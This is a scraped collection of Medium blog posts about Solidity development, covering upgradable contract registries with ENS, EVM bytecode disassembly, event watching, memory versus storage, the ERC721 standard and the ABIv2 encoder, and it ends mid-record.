CstLibrary.solAnother interesting thing to note: we\u2019ve done some extra work in our storage contract to allow our ledgers (and multi-ledgers) to be iterate-able so that our storage is more easily introspected. It does cost additional gas to maintain such structures; but for our specific use-cases, we felt the additional gas fees were worth the trade-off.For completeness, the specialized form of our ledger storage appears below:CstLedger.solYou can see how we use our ledger storage in our main ERC20 token contract. Below are an example of a few of the ERC20 functions that leverage the ledger-specific storage:Snippet from CardstackToken.solRegistryThe next component of our upgradable approach is the registry. The registry creates a nice abstraction over the actual Ethereum addresses for the contracts that participate in our ecosystem. The idea is that we only need to know the \u201cname\u201d of a contract, and query the registry for the most recent version of the contract that has a particular name. In addition, contracts that need to use the shared storage do not need to know the address of the shared storage; rather, they can declare to the registry their interest in using a particular bucket of storage (which also has a name), and the registry will take care of binding the storage to the contract that declared interest in using it. So at a real high-level, the registry is doing the work of keeping track of the addresses of all the contracts in our system and mapping the names of contracts to the addresses of contracts.registry.addStorage()After the storage contract is deployed we add it to the registry and give the storage contract a name by calling registry.addStorage(). From this point forward, when contracts are registered with the registry they can declare their intent to use the storage by name. The registry is then responsible for resolving the storage name to a specific address, as well as granting the contract \u201cpermissions\u201d to use the storage (more on this later).registry.registerContract()For contracts that participate in our ecosystem that are not storage contracts, e.g. our token contract, we use registry.registerContract() to add them to our registry. Our contracts implement a storable.sol interface, which has the following declaration:storable.solAs you may see, the ledger name and storage name used by the token contract are specified in the constructor of our token contract and then just returned in the storable.sol functions. Additionally, our token contract implements a configurable.sol interface, which declares a configureFromStorage() function. In this function we the registry to resolve the storage names to actual addresses:CardstackToken.sol (snippet)And at this point we have a token contract that is bound to the storage contract(s) for which it is has declared an interest.So a quick recap:We add storage to the registry and assign the storage a name.We create contracts (in this case a token contract) that declare an interest in using storage with a specific name.We register a contract with the registry, which then resolves the names of the storage to specific Ethereum addresses within the contract being registered.upgradeContract()The ability to upgrade a contract is exposed in the upgradeContract() function. This function\u2019s parameters are the name of the contract and the address of the \u201csuccessor\u201d contract (where the current contract becomes the predecessor contract). The registry will use the same mechanism that was leveraged in the registration of the predecessor contract to discover the storage that the successor contract has declared it is interested in using. The registry resolves the address for the storage in the successor contract and binds the storage within the successor contract using configureFromStorage().During the upgrade operation, the permissions of the predecessor contract upon the storage is revoked, so that the predecessor contract can no longer manipulate the storage. Likewise, the permissions of the successor contract upon the storage is granted, so that the successor contract can manipulate the storage. Additionally, the modifier unlessUpgraded will prevent the predecessor contract\u2019s functions from executing, and instead cause them to revert. The predecessor contract also acquires a property that points to the successor contract as result of the registry upgrading the contract, so the clients of the contract can discover the new address of the upgraded contract (the successor contract). Finally a ContractUpgraded event is emitted when the contract upgrades (as well as an AddrChanged event for EIP-137 ENS resolver support \u2014 more on that later).But what about \u201cpermissions\u201d?So I mentioned the word \u201cpermissions\u201d a few times in this post \u2014 what do I mean by that? The Cardstack contracts have the ability to designate addresses from which msg.send calls can invoke privileged functions. In addition, we have devised two different levels (as of the time of this writing) of privileged access (most likely there will be many more, and we\u2019ll probably want to further generalize this solution as time goes on). The lower level role of privileged access is what I\u2019m calling an \u201cadmin\u201d, and the higher level role of privileged access is what I\u2019m calling a \u201csuper admin\u201d. Generally admins have the ability to modify storage, while super admins have the ability to create admins, register contracts, and upgrade contracts.We use a administratable.sol base contract that supplies the ability to add and remove admins and super admins as well as modifiers to designate that functions are only able to be invoked by admins and super admins, or more restrictively, just super admins. Additionally, we use iterate-able maps so that we can easily introspect our administrative addresses.administrable.solFor reference the full Registry.sol appears below which shows how storage is added, how contracts are registered, and how contracts are upgraded:Registry.solEthereum Name Service (ENS)The capstone to this whole process is the Ethereum Naming Service (ENS). ENS allows contracts to be addressed using a human friendly name instead of a non-human friendly string of hexadecimal characters https://ens.domains/. This allows users to interact with a token contract at the address cardstack.eth instead of the address 0x66406f50624a645f36faa517c39049200d55c56e; much like being able to use the a domain name like https://google.com instead of https://172.217.12.206. The Cardstack registry adheres to EIP-137, which is the standard governing ENS, such that it can act as a \u201cnamehash\u201d resolver (which is how ENS internally represents contract names). Because the registry is already keeping track of the address of the latest version of any contract, using it as a resolver for ENS is a very natural fit.As part of the registration of a contract with the the Cardstack registry, the \u201cnamehash\u201d of the contract name is supplied to the register() function. The namehash can be derived off-chain using a script (check out https://github.com/danfinlay/eth-ens-namehash) that converts the human-friendly contract name into a namehash. The registry contract\u2019s address can then be used as the resolver ENS, such that it resolves the address of the latest version of a token contract for the namehashes that are presented to it.Putting It All TogetherThe approach that Cardstack is taking to realize upgradable contracts in Solidity includes these 3 important features:Sequestering state into its own contract(s)Using a registry contract to manage contract addresses and to bind contracts to their stateResolving ENS namehash lookups to contract addressesBy embracing these approaches for contract development, Cardstack can create contracts that can evolve over time to satisfy the ever-changing needs of the people that use our applications.This is the first of hopefully many updates we\u2019ll be sharing on our experience in Solidity at Cardstack \u2014 stay tuned.Read MoreHow to Get One Billion Users on Blockchain by Chris TseGrowing a Healthy Software Ecosystem by Lead Developer Ed FaulknerBuilding on Blockchain the Right WayThe Cardstack White PaperJoin our communityTo learn more about Cardstack, visit https://cardstack.com.Join the Cardstack community channel on Telegram at https://t.me/cardstackHassan (@habdelra) has been designing and building a system for digital scarcity and digital rights on the bitcoin blockchain since 2014. He has been working on open-source Cardstack codebase since 2015 focusing on bringing external data sources into the Cardstack framework. Hassan is leading the design and architecture efforts in Solidity for Cardstack, and is an expert on the trade-offs of on-chain and off-chain computation and storage. Hassan has a Bachelor\u2019s degree in Computer Science and Mathematics from the Colorado School of Mines.", "responses": 2, "tags": ["Ethereum", "Blockchain", "Solidity", "Smart Contracts", "Tech"]}, {"title": "Deconstructing a Solidity Contract \u2014Part I: Introduction", "post_link": "https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737?source=search_post", "author_name": "Alejandro Santander", "author_link": "https://medium.com/@_ajsantander", "publish_date": "2018-08-13", "last_modified_date": "2019-02-13", "readtime": "6.65", "claps": 740, "voters": 67, "content": "Deconstructing a Solidity Contract \u2014Part I: IntroductionAlejandro SantanderFollowAug 13, 2018 \u00b7 7 min readBy Alejandro Santander in collaboration with Leo Arias.Image from www.szzljy.comYou\u2019re on the road, driving fast in your rare, fully restored 1969 Mustang Mach 1. The sunlight shimmers on the all-original, gorgeous plated rims. It\u2019s just you, the road, the desert, and the never-ending chase of the horizon. Perfection!In the blink of an eye, your 335 hp beast is engulfed in white smoke, as if transformed into a steam locomotive, and you\u2019re forced to stop on the side of the road. With determination, you pop the hood, only to realize that you have absolutely no idea what you\u2019re looking at. How does this damn machine work? You grab your phone and discover that you have no signal.Image from www.mustangandfords.comCould this perhaps be an analogy for your current knowledge of dApp development? In the analogy, the Mustang is your set of smart contracts, the rims are all those well-thought-out little details and the \u2764 you put into them. And the popping of the hood is you looking into your contract\u2019s EVM bytecode and having absolutely no idea what\u2019s going on.If this sounds familiar, then not to worry! The purpose of this series of articles is to deconstruct a simple Solidity contract, look at its bytecode, and break it apart into identifiable structures down to the lowest level. We\u2019ll pop the hood on Solidity. By the end of the series, you should feel comfortable when looking at or debugging EVM bytecode. The whole point of the series is to demystify the EVM bytecode produced by the Solidity compiler. And it\u2019s really much simpler than it seems.Note: This series is aimed at developers who already feel comfortable with and have experience in developing Solidity contracts, but want to understand how things work at a slightly deeper/lower level \u2014 that is, how Solidity is translated into EVM bytecode by the Solidity compiler, and how the EVM executes such bytecode. If you aren\u2019t there just yet, I recommend reading this great introduction by Facu Spagnuolo: A Gentle Introduction to Ethereum Programming.Here\u2019s the contract we\u2019ll deconstruct:BasicToken.solNote: This contract is susceptible to an overflow attack, but we\u2019re just keeping it simple here for the purpose at hand.Compiling the contractTo compile the contract, we\u2019ll be using Remix. Go ahead and create a new contract by clicking on the + button on the top left, above the file browser area. Set the filename to BasicToken.sol. Now, paste the above code into the editor section.In the right-hand section, go to the Settings tab and make sure Enable Optimization is selected. Also, verify that the selected version of the Solidity compiler is \u201cversion:0.4.24+commit.e67f0147.Emscripten.clang\u201d. These two details are very important, otherwise you\u2019ll be looking at slightly different bytecode from what will be discussed here.If you go to the Compile tab and click on the Details button, you should see a popup with all the stuff that the Solidity compiler generates, one of which is a JSON object named BYTECODE that has an \u201cobject\u201d property, which is the compiled code of the contract. It looks like this:608060405234801561001057600080fd5b5060405160208061021783398101604090815290516000818155338152600160205291909120556101d1806100466000396000f3006080604052600436106100565763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166318160ddd811461005b57806370a0823114610082578063a9059cbb146100b0575b600080fd5b34801561006757600080fd5b506100706100f5565b60408051918252519081900360200190f35b34801561008e57600080fd5b5061007073ffffffffffffffffffffffffffffffffffffffff600435166100fb565b3480156100bc57600080fd5b506100e173ffffffffffffffffffffffffffffffffffffffff60043516602435610123565b604080519115158252519081900360200190f35b60005490565b73ffffffffffffffffffffffffffffffffffffffff1660009081526001602052604090205490565b600073ffffffffffffffffffffffffffffffffffffffff8316151561014757600080fd5b3360009081526001602052604090205482111561016357600080fd5b503360009081526001602081905260408083208054859003905573ffffffffffffffffffffffffffffffffffffffff85168352909120805483019055929150505600a165627a7a72305820a5d999f4459642872a29be93a490575d345e40fc91a7cccb2cf29c88bcdaf3be0029Yup. That\u2019s completely unreadable (at least for a normal human being).Deploying the contractNext, go to the Run section in Remix. At the top, make sure you\u2019re using the Javascript VM. This is basically an embedded Javascript EVM + network, our ideal Ethereum playground. Make sure BasicToken is selected in the ComboBox, and enter the number 10000 in the Deploy input box. Next, click the Deploy button. This should deploy an instance of our BasicToken contract, with an initial supply of 10000 tokens owned by the account currently selected at the top of the account ComboBox, which will hold the totality of our token supply.Lower in the Run tab, in the Deployed Contracts section, you should see the deployed contract, with fields to interact with its three functions: transfer, balanceOf, and totalSupply. Here, we\u2019ll be able to interact with the instance of the contract we just deployed.But before that, let\u2019s take a look at exactly what \u201cdeploying\u201d the contract means. At the bottom of the page, in the console area, you should see the log \u201ccreation of BasicToken pending\u2026\u201d, followed by a transaction entry with various fields: from, to, value, data, logs, and hash. Click on this entry to expand the transaction\u2019s info. Even though abbreviated, you should see that the data/input of the transaction is the same bytecode we presented above. This transaction is sent to the 0x0 address, and as a result, a new contract instance is created, with its own address and code. We\u2019ll examine this process in detail in the next article.Disassembling the bytecodeTo the right of the transaction\u2019s data, still in the console, click on the Debug button. This will activate the Debugger tab in Remix\u2019s right-hand area. Let\u2019s take a look at the Instructions section. If you scroll down, you should see the following:000 PUSH1 80002 PUSH1 40004 MSTORE005 CALLVALUE006 DUP1007 ISZERO008 PUSH2 0010011 JUMPI012 PUSH1 00014 DUP1015 REVERT016 JUMPDEST017 POP018 PUSH1 40020 MLOAD021 PUSH1 20023 DUP1024 PUSH2 0217027 DUP4028 CODECOPY029 DUP2030 ADD031 PUSH1 40033 SWAP1034 DUP2035 MSTORE036 SWAP1037 MLOAD038 PUSH1 00040 DUP2041 DUP2042 SSTORE043 CALLER044 DUP2045 MSTORE046 PUSH1 01048 PUSH1 20050 MSTORE051 SWAP2\u2026 (abbreviated)To make sure that you\u2019re following the same set of opcodes described in this series, please compare what you see in Remix with the bytecode in this gist.This is the disassembled bytecode of the contract. Disassembly sounds rather intimidating, but it\u2019s quite simple, really. If you scan the raw bytecode by bytes (two characters at a time), the EVM identifies specific opcodes that it associates to particular actions. For example:0x60 => PUSH0x01 => ADD0x02 => MUL0x00 => STOP...The disassembled code is still very low-level and difficult to read, but as you will see, we can start making sense out of it.OpcodesBefore we get started on our ambitious endeavour of completely deconstructing the bytecode, you\u2019re going to need a basic tool set for understanding individual opcodes such as PUSH, ADD, SWAP, DUP, etc. An opcode, in the end, can only push or consume items from the EVM\u2019s stack, memory, or storage belonging to the contract. That\u2019s it.To see all the available opcodes that the EVM can process, check out this handy gist from Pyethereum showing a list of the opcodes. To understand what each one does and how it works, Solidity\u2019s assembly documentation is a great reference. Even though it\u2019s not a one-on-one relationship with the raw opcodes, it\u2019s pretty close (it\u2019s actually Yul, an intermediate language between Solidity and EVM bytecode). Finally, if you can speak scientician, there\u2019s always the Ethereum Yellow Paper to fall back on.There\u2019s no point in reading these resources from start to finish right now; just keep them around for reference. We\u2019ll be using them as we go along.InstructionsEach line in the disassembled code above is an instruction for the EVM to execute. Each instruction contains an opcode. For example, let\u2019s take one of those instructions, instruction 88, which pushes the number 4 to the stack. This particular disassembler interprets instructions as follows:88 PUSH1 0x04|  |     |     |  |     Hex value for push.|  Opcode.Instruction number.Even though the disassembled code brings us one step closer to understanding what\u2019s going on, it\u2019s still quite intimidating. We\u2019re going to need a strategy for deconstructing the whole thing, which has 596 instructions!The StrategyProblems that appear to be overwhelming at first usually succumb to the all-powerful, all-mighty \u201cdivide-and-conquer\u201d strategy, and this problem is no exception to the rule. We\u2019ll identify split points in the disassembled code and reduce it bit by bit, until we end up with small, digestible chunks, which we\u2019ll walk through step by step in Remix\u2019s debugger. In the following diagram, we can see the first split we can make on the disassembled code, which we\u2019ll analyze completely in the next article.You can find the end result of the entire deconstruction in the deconstruction diagram. Don\u2019t worry if you don\u2019t understand the diagram at first. You\u2019re not supposed to. This series will go through it step by step. Keep it around so you can keep track of the big picture as we go along.The series is divided into the following set of articles. If you\u2019re up for the challenge, get started with the actual deconstruction in Part II. See you there!Deconstructing a Solidity Contract \u2014 Part I: Introduction \u2714Deconstructing a Solidity Contract \u2014 Part II: Creation vs. RuntimeDeconstructing a Solidity Contract \u2014 Part III: The Function SelectorDeconstructing a Solidity Contract \u2014 Part IV: Function WrappersDeconstructing a Solidity Contract \u2014 Part V: Function BodiesDeconstructing a Solidity Contract \u2014 Part VI: The Metadata HashBe part of the communityContinue the discussion on our forumJoin our Telegram groupFollow us on TwitterEven better, join the team \ud83d\ude80", "responses": 3, "tags": ["Ethereum", "Solidity", "Guides"]}, {"title": "Watching Solidity Events \u2014 the right way", "post_link": "https://medium.com/@theMadKing/watching-solidity-events-the-right-way-d3d0a30bdc4d?source=search_post", "author_name": "Raghav Dua", "author_link": "https://medium.com/@theMadKing", "publish_date": "2016-07-21", "last_modified_date": "2019-01-19", "readtime": "2.53", "claps": 371, "voters": 56, "content": "Watching Solidity Events \u2014 the right wayThis post is meant for solidity noobs (like me) who have recently started dabbling with ethereum dapp development & the blockchain technology.Raghav DuaFollowJul 21, 2016 \u00b7 3 min readI\u2019ve had a hard time following Solidity tutorials and its official documentation. Some snippets are simply not up-to-date, especially the web3 API. Those few things can be really frustrating to figure out on your own, and I\u2019ve taken great pains to figure out the actual web3 API usage rather than what\u2019s described in the doc, and I\u2019d like to share them. This is the first post in the series and also my first blog, hopefully you will not be so disappointed =)ps- you can also read the same on my repositoryEvents help clients keep track of a particular occurrence \u2014 the closing of an Auction, for example. So let\u2019s explore how to create events, emit them and establish a mechanism that notifies us upon firing of the particular eventWe\u2019ll start with a very basic Auction Contract. The end result will load an HTML document which notifies that the call to close the auction will be made after 3 seconds. When the auction is closed, an event is triggered, notifying web3 of the closing, which in turn notifies our listener, whose code changes the text to \u201cAuction closed\u201d.Below are the 3 truffle files (the entire truffle project will soon be available under the \u201cproject\u201d directory):index.html<!DOCTYPE html><html><head>  <title>MetaCoin - Default Truffle App</title>  <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>  <link href=\"./app.css\" rel='stylesheet' type='text/css'>  <script src=\"./app.js\"></script></head><body>  <div id = \"status\">Closing Auction in 3 seconds...</div></body></html>Auction.solcontract Auction {  event AuctionClosed (uint highestBid);  //declare eventto be triggered when Auction closes  address public creator;  function Auction () { //Auction Constructor to register the creator of the contract    creator = msg.sender;  }  function closeAuction (uint someRandomBid) {    if (msg.sender == creator) {  //make sure that auction is being ended by the creator themselves      AuctionClosed (someRandomBid);  //trigger the event to notify the listeneres that the auction has ended      return;    }    throw;  }}(NOTE: For production-quality code, you\u2019re better off using security-audited libraries like Zeppelin\u2019s and a security-focused linter like Ethlint)app.jswindow.onload = function () {  let accounts = web3.eth.accounts; //create local variable for easy access  let maxBid = Math.ceil (Math.random () * 1000); //the maximum bid placed by the end of the auction  let status = document.getElementById ('status');  Auction.new ({from: accounts [0]}) //create new contract object    .then ( (contract) => {      contract.AuctionClosed ().watch ( (err, response) => {  //set up listener for the AuctionClosed Event        //once the event has been detected, take actions as desired        status.innerHTML = 'The auction has ended! Highest Bid is ' + response.args.highestBid;      });      setTimeout ( () => {  //simulate an auction for 3 seconds, after which the creator closes the auction        contract.closeAuction (maxBid, {from: accounts [0]});      }, 3000);    })    .catch ( (err) => {      status.innerHTML = 'Some error occured. I guess shit happens =(';    });};The main thing in our Solidity contract is the declaration and triggering of the AuctionClosed event. The main thing in app.js is the right way to use the web3 API to listen for events and act upon them as and when they occur.Now, fire up 2 terminals. In the first one, launch the testrpc utility to simulate the ethereum blockchain:testrpcIn the second terminal, navigate to the root directory of this project, then:truffle compiletruffle serveThen open up your browser and launch http://localhost:8080/ (if you haven\u2019t messed around with any of the default settings), wait for 3 seconds and BAM! You will see the highest bid (randomly generated, duh).NOTE: There is no gas involved in this because testrpc is basically a simulation.That\u2019s all folks. Would love to hear your feedback on this =)If you liked it, share it with your friends so they too can learn something new. If you hated it, share it with your friends so they too suffer through this piece of crap tut!", "responses": 7, "tags": ["JavaScript", "Ethereum", "Solidity", "Blockchain", "Dapp"]}, {"title": "Ethereum Solidity: Memory vs Storage & When to Use Them", "post_link": "https://medium.com/coinmonks/ethereum-solidity-memory-vs-storage-which-to-use-in-local-functions-72b593c3703a?source=search_post", "author_name": "Forest Fang", "author_link": "https://medium.com/@saurfang", "publish_date": "2018-03-18", "last_modified_date": "2018-12-11", "readtime": "3.85", "claps": 475, "voters": 63, "content": "Ethereum Solidity: Memory vs Storage & When to Use ThemForest FangFollowMar 18, 2018 \u00b7 4 min readSomeone asked me on Github whether we should use storage or memory keyword in the following simplified code snippet:For getUsingStorage and getUsingMemory, I tried both storage and memory and my unit tests were able to pass in both cases. So what\u2019s the difference between storage and memory anyway and when should we use them?According to Solidity documentation, these two keywords are used for Reference Types whereComplex types, i.e. types which do not always fit into 256 bits have to be handled more carefully than the value-types we have already seen. Since copying them can be quite expensive, we have to think about whether we want them to be stored in memory (which is not persisting) or storage(where the state variables are held).\u2026Every complex type, i.e. arrays and structs, has an additional annotation, the \u201cdata location\u201d, about whether it is stored in memory or in storage.It is now important to look at where EVM (Ethereum Virtual Machine) stores data:The Ethereum Virtual Machine has three areas where it can store items.The first is \u201cstorage\u201d, where all the contract state variables reside. Every contract has its own storage and it is persistent between function calls and quite expensive to use.The second is \u201cmemory\u201d, this is used to hold temporary values. It is erased between (external) function calls and is cheaper to use.The third one is the stack, which is used to hold small local variables. It is almost free to use, but can only hold a limited amount of values.Most importantly,If you e.g. pass such variables in function calls, their data is not copied if it can stay in memory or stay in storage.This is where it gets confusing:The storage and memory keywords are used to reference data in storage and memory respectively.Contract storage is pre-allocated during contract construction and cannot be created in function call. After all, it makes little sense to create new variable in storage in a function if it is to be persisted.Memory cannot be allocated during contract construction but rather created in function execution. Contract state variable is always declared in storage. Again, it makes little sense to have state variable that cannot persist.When assigning a memory referenced data to a storage referenced variable, we are copying data from memory to storage. No new storage is created.When assigning a storage reference data to a memory referenced variable, we are copying data from storage to memory. New memory is allocated.When a storage variable is created in function locally by look up, it simply reference data already allocated on Storage. No new storage is created.To recap, refer back to the documentation:Forced data location:* parameters (not return) of external functions: calldata* state variables: storageDefault data location:* parameters (also return) of functions: memory* all other local variables: storageWe can change data location only for parameters of functions and local variables in function. Whenever a storage reference is casted to memory, a copy is made, and further modification on the object does not propagate back to contract state. memory reference can only be \u201cassigned\u201d to storage reference if memory data can be copied to a pre-allocated state variable.Back to our illustrative contract above, for getters:function getUsingStorage(uint _itemIdx)public// set to non-view to estimate gas// viewreturns (uint){Item storage item = items[_itemIdx];return item.units;}function getUsingMemory(uint _itemIdx)public// set to non-view to estimate gas// viewreturns (uint){Item memory item = items[_itemIdx];return item.units;}Both functions return the same result, except in the getUsingMemory a new variable is created and resulting in more gas used:// getUsingStorage\"gasUsed\": 21849// getUsingMemory\"gasUsed\": 22149,On the other hand, for setters:function addItemUsingStorage(uint _itemIdx, uint _units)public{Item storage item = items[_itemIdx];item.units += _units;}function addItemUsingMemory(uint _itemIdx, uint _units)public// set to non-view to estimate gas// view{Item memory item = items[_itemIdx];item.units += _units;}Only addItemUsingStorage modified the state variable (consuming more gas):// addItemUsingStorage// `units` changes in `items`\"gasUsed\": 27053,// addItemUsingMemory// `units` does not change in `items`\"gasUsed\": 22287,So to close, the takeaways are:memory and storage specifies which data location the variable refers tostorage cannot be newly created in a function. Any storage referenced variable in a function always refers a piece of data pre-allocated on the contract storage (state variable). Any mutation persists after function call.memory can only be newly created in a function. It can either be newly instantiated complex types like array/struct (e.g. via new int[...]) or copied from a storage referenced variable.As references are passed internally through function parameters, remember they default to memory and if the variable was on storage it would create a copy and any modification would not persist.References:In Ethereum Solidity, what is the purpose of the \"memory\" keyword?Without the memory keyword, Solidity tries to declare variables in storage. Lead Solidity dev chriseth: \"You can think\u2026stackoverflow.comWhat does the keyword \"memory\" do exactly?The Solidity FAQ on \"memory\" is highly recommended reading in entirety, and a snippet is provided below. The Ethereum\u2026ethereum.stackexchange.comEthereum Solidity: Memory vs Storage & How to initialize an array inside a structIn Loom Network\u2019s Telegram (which has ~8,000 members!) people ask questions on various topics such as Loom\u2019s roadmap\u2026medium.com", "responses": 3, "tags": ["Programming", "Solidity", "Ethereum", "Blockchain", "Smart Contracts"]}, {"title": "Jumping into Solidity \u2014The ERC721 Standard (Part 1)", "post_link": "https://medium.com/coinmonks/jumping-into-solidity-the-erc721-standard-part-1-e25b67fc91f3?source=search_post", "author_name": "Andrew Parker", "author_link": "https://medium.com/@anallergytoanalogy", "publish_date": "2018-04-15", "last_modified_date": "2018-06-17", "readtime": "4.08", "claps": 423, "voters": 53, "content": "Jumping into Solidity \u2014The ERC721 Standard (Part 1)Andrew ParkerFollowApr 15, 2018 \u00b7 5 min readA few months ago I decided to learn Solidity, the programming language used for writing smart contracts for the Ethereum blockchain.This article isn\u2019t an intro to Solidity, so I\u2019m going to assume you know what a blockchain is, what Ethereum is, and the very basics of Solidity. *(See footnotes if you are a beginner).Over the next few posts, I\u2019ll be exploring the ERC721 Standard, how it works, its variants, and writing a scalable implementation which you are free to use. In this post we won\u2019t be starting any coding. I\u2019ll be introducing you to Non-Fungible Tokens, and ERC Standards in general to begin with.\u201cArchitect draws blueprints with a ruler on a table\u201d by Daniel McCullough on UnsplashWhat is the ERC721 Standard?The ERC721 Standard is a (draft) standard for creating Non-Fungible Token (NFT) contracts. Non-fungible means not completely interchangeable. A dollar coin is fungible, because if I give you a dollar coin and you give me a dollar coin, neither of us are better or worse off \u2014 a dollar is a dollar. However, if I give you my pet cat and you give me your pet cat, we may not be happy, because pet cats are not completely interchangeable \u2014 they are non-fungible.In 2017, the game Cryptokitties demonstrated how non-fungible assets can be made and traded on the Ethereum blockchain. In this game, players can breed and trade Kitties \u2014 but crucially, all the Kitties exist on the blockchain, and can only be bred or traded by the player who owns them. Contrast this to a traditional online game where the data is stored on a central server, and game admins are able to make changes as they see fit. In Cryptokitties, players buy and sell their Kitties on a decentralised and trustless network, with ownership of their Kitties being irrefutably provable. If you own a Kitty, the blockchain proves that it\u2019s yours and nobody else\u2019s.You may be thinking, \u201cSo what? It\u2019s just a game with pretend cats!\u201dThe goal of Cryptokitties was to show that non-fungible assets can be made and traded on the blockchain. Suppose that instead of representing a pretend cat, your NFT could represent the deed to a house. You could sell that token to someone else, and ownership of the token and payment (in ETH) could be exchanged without the need for any expensive lawyers or any other middlemen.And so, through Crpytokitties, the idea for an NFT standard was introduced to the Ethereum community. That idea became a proposal, and that proposal became a draft for a standard, which is what we have today, the ERC721 (draft) Standard. The number 721 isn\u2019t particularly meaningful, it was just the 721st Ethereum improvement proposal on Github.So what actually is it?An ERC standard is basically a set of rules which enables your contract play to well with other developers\u2019 contracts (or DApp, website, other software, etc). By providing some guidelines for required functions, and some restrictions on how they should behave, other programmers can write code that interacts with yours without having to know your entire codebase.To pick one example, the balanceOf function is defined by the standard:function balanceOf(address _owner) external view returns (uint256);The standard says that your ERC721 contract must include this function. It must take one argument (an address), and must return the number of tokens that address owns (a uint \u2014 these are non-fungible tokens so they can\u2019t be divided).The standard doesn\u2019t really care how your function works. It could be as simple as returning the value of a mapping, or some complex series of equations and internal function calls. The only thing the standard cares about is that when someone calls balanceOf on an address they get a uint with the balance of that address.I say the standard doesn\u2019t really care about how your function works, because in some cases there will be extra instructions or restrictions. For the above balanceOf function, the standard has the following restriction:/// @dev NFTs assigned to the zero address are considered invalid, and this function throws for queries about the zero address.So, if someone callsbalanceOf(0x0)your function must throw an error. When writing your ERC721 compliant contract, you must make sure all your functions adhere to their respective rules. I\u2019ll address these as they come up.Some things to noteThe standard doesn\u2019t prevent you from adding extra functions, or extra rules to your contract. As long as your additions don\u2019t conflict with the rules laid out by the standard, they\u2019re perfectly acceptable.I\u2019ve seen many questions on Stack Exchange where people have thought a particular contract or interface file they found online was the standard, either for ERC721 or ERC20 (the Fungible token standard). They worry that their contract isn\u2019t identical to a particular implementation, and often try to \u201cfix\u201d something that isn\u2019t a problem. This is why returning to the ERC721 standard is always a good idea when writing your own contract from scratch. It says in clear English (and Solidity) what is and is not allowed.So if you follow all the rules set out by ERC721, then regardless of what else is going on in your NFT contract, it will be compliant. Compliance is a good thing, because it means it will be easier for other people to use your token. If it\u2019s easier to use, then people are more likely to adopt it.I hope this has been a useful introduction to the ERC721 standard. In my next post we\u2019ll take a look at some code for the standard\u2019s interfaces, and I\u2019ll cover some aspects of the ERC721 standard that I found confusing in the beginning.Next: Jumping into Solidity \u2014 The ERC721 Standard (Part 2)If you\u2019re new to Solidity, there are plenty of excellent resources out there, but be careful because Solidity is rapidly evolving so a lot of the online resources may be out of date. At the time of writing, we\u2019re up to Solidity 0.4.21, and any resources that cover versions below about 0.4.16 may not be useful. I found this Udemy course particularly helpful as an entry point.", "responses": 0, "tags": ["Ethereum", "Solidity", "Tutorial", "Dapps Tutorial", "Erc721"]}, {"title": "Solidity ABIv2: A Foray into the Experimental", "post_link": "https://blog.ricmoo.com/solidity-abiv2-a-foray-into-the-experimental-a6afd3d47185?source=search_post", "author_name": "RicMoo", "author_link": "https://blog.ricmoo.com/@ricmoo", "publish_date": "2018-03-05", "last_modified_date": "2019-01-14", "readtime": "2.41", "claps": 869, "voters": 64, "content": "Solidity ABIv2: A Foray into the ExperimentalRicMooFollowMar 5, 2018 \u00b7 3 min readToday we released v3.0 of ethers.js, a leading library for Ethereum dApps and web3.js alternative. To celebrate the release, this is the first post in a series on using some of the more interesting techniques and features available to Ethereum application.The ABI (Application Binary Interface) is how a dApp communicates with a Solidity contract; by making function calls, returning data and receiving events. The classic ABI coder does not permit arrays of dynamic types, structs or nested variables between the Solidity contract and the dApp.This article focuses on a new experimental feature of Solidity, the ABI v2 coder; which allows structs, nested and dynamic variables to be passed into functions, returned from functions and emitted by events.This example is just a quick demo and should not be considered a production ready (or even production relevant), but is just to get a feel for the potential uses of the ABI v2 coder.pragma solidity ^0.4.24;// Enable the ABI v2 Coderpragma experimental ABIEncoderV2;contract UserDirectory {    struct Contact {        string email;        string phone;    }    struct User {        string name;        address addr;        Contact contact;    }    address _admin;    mapping (address => User) _users;    // User struct in the event    event UserAdded(address indexed addr, User user);    constructor() {        _admin = msg.sender;    }    // User struct in the method signature    function addUser(User user) public {        require(msg.sender == _admin);        _users[user.addr] = user;        emit UserAdded(user.addr, user);    }    // User struct in the returns    function user(address addr) public view returns (User user) {        return _users[addr];    }}Once we have deployed this contract to the Ropsten Test Network we can begin to interact with it, first by adding a user using structured data.var contract = new ethers.Contract(contractAddress, abi, wallet);var user = {    name: 'Rick Sanchez',    addr: '0xCB00CDE33a7a0Fba30C63745534F1f7Ae607076b',    contact: {        email: 'rick.c137@citadel.cfc',        phone: '+1 (555) 314-1593'    }};contract.addUser(user).then(function(tx) {    console.log(tx);});Once the above transaction is mined, we can use the contract user getter to retrieve the structured data from the contract.var address = '0xCB00CDE33a7a0Fba30C63745534F1f7Ae607076b'contract.user(address).then(function(user) {    console.log(user);    // {    //    name: \"Rick Sanchez\",    //    addr: \"0xCB00CDE33a7a0Fba30C63745534F1f7Ae607076b\"    //    contact: {    //        email: \"rick.c137@citadel.cfc\",    //        phone: \"+1 (555) 314-1593\",    //    }    // }});And if we install the onuseradded event listener on the contract, we will get notified whenever any user is added with the structured data.contract.onuseradded = function(address, user) {    console.log(user);    // {    //    name: \"Rick Sanchez\",    //    addr: \"0xCB00CDE33a7a0Fba30C63745534F1f7Ae607076b\"    //    contact: {    //        email: \"rick.c137@citadel.cfc\",    //        phone: \"+1 (555) 314-1593\",    //    }    // }};Please keep in mind this is still considered a highly experimental feature.In addition to structures and nesting, the ABI v2 coder enables arrays of dynamic objects such asstring[] anduint256[][] which were previously not possible.The ethers.js library aims to provide a single complete and secure library to handle all the functionality you need to safely and easily create Ethereum applications. Some of the extra features include:Connect to the Ethereum blockchain over JSON-RPC, INFURA, Etherscan, Web3 Providers or MetaMask (more back-end services coming soon)Tiny (79kb compressed; 242kb uncompressed)ENS names are first-class citizens; you can use them intead of an address in almost any function that takes an Ethereum addressLarge suite of test cases (~20,000), both hand-picked and procedurally generatedExtensive documentationFully MIT licensed (including all dependencies)Thanks for reading, and I hope you found this useful. Please feel free to open any issues for ethers.js on GitHub or follow me on Twitter.", "responses": 4, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Ethers"]}, {"title": "Solidity 102 #3: Maintaining Sorted list", "post_link": "https://medium.com/bandprotocol/solidity-102-3-maintaining-sorted-list-1edd0a228d83?source=search_post", "author_name": "Bun Uthaitirat", "author_link": "https://medium.com/@taobunoi", "publish_date": 